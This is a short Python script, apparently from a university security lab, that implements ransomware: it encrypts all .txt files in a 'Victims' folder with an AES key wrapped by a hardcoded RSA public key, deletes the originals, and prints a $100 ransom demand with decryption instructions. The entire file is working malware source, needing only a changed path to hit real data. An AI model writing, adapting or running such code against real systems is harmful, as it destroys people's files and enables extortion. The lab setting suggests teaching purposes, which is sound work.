import os
import sys
import Crypto
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

pub_key = '''-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCkQxlb1oPNbkdZ+pVTrltiDQuD
xONUl8vTrJcaWe2GfolRTaqddKyGt4HrXZld8n7NTipjDLTSEqJDyO6Zga/sCTWN
EXiHOF5iT8Hc5+PJ+Ys6FUef0UJUeSBFtmZhMLiUWrX860YfHzymQF3+gwfHkUuy
MYbU2Yhv7gUZZOH3ewIDAQAB
-----END PUBLIC KEY-----'''
e = RSA.importKey(pub_key) # hardcoded key generated

sess_key = get_random_bytes(16)
cipher_rsa = PKCS1_OAEP.new(e)
enc_sess_key = cipher_rsa.encrypt(sess_key) # encrypted session key

with open('/home/cse/Lab3/Q6files/EncryptedSharedKey.txt', 'wb') as f:
  f.write(enc_sess_key)

for victim in os.scandir('/home/cse/Lab3/Q6files/Victims'):
  if victim.path.endswith('.txt'):
  
    with open(victim.path, 'rb') as f:
      data = f.read()
  
    #data = open(victim).read().encode('utf-8') # reads data and saves it as bytes
    
    cipher_aes = AES.new(sess_key, AES.MODE_EAX)
    enc_data, tag = cipher_aes.encrypt_and_digest(data) # creates encrypted data
    
    with open(f'{victim.path}.encrypted', 'wb') as f: # writes encrypted data in file
      for x in (cipher_aes.nonce, tag, enc_data):
        f.write(x)
    
    os.remove(victim.path) # remove unencrypted file
    
print('\nwarning: all of your files are being held for ransom')
print('i will give you a secret code once you pay me $100')
print('type [python3 D6.py (secret code)] and get your files back!\n')